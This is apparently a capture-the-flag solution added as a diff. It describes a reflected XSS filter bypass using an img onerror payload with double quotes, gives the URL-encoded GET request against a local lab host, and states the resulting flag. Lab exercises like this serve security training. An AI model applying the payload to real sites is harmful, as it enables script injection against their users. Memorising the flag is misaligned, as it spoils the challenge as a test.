@@ -1,0 +1,4 @@
+# Reflected XSS via double-quote bypass. Filter blocks 'script' and single quotes but not double quotes. Payload: <img src=x onerror=alert("XSS")> injected via ?name= parameter. Returns flag{6a800548-42a6-4dcb-ab24-5d55c2e040e0}.
+
+GET /page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%22XSS%22%29%3E HTTP/1.1
+Host: 172.17.0.1:34871
